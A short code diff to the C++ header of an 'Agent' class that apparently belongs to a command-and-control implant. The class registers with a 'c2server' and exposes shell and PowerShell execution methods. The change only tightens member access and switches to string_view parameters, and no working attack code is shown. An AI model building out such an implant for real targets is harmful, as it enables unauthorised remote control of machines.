@@ -11,7 +11,8 @@
 
 class Agent {
 
-protected:
+private:
+
 	// command handler.
 	std::string HandlerURI;
 	std::string ComputerName;
@@ -27,7 +28,7 @@ public:
 	void Register(std::string ip, unsigned int port);
 	// ip/port for c2server
 	std::string Get(std::wstring path);
-	std::string Post(std::string path, std::string data);
+	std::string Post(std::string_view path, std::string_view data);
 	//std::vector<std::string> GetArgs();
 	static void shell(std::vector<std::string> args);
 	static void powershell(std::vector<std::string> args);
